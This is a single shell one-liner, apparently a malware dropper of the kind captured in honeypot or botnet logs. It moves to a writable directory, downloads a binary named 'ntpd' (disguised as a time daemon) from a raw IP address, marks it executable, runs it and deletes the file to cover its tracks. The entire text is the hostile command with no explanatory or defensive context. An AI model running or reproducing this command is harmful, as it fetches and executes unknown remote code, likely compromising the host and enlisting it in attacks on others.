cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.207.153.28/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
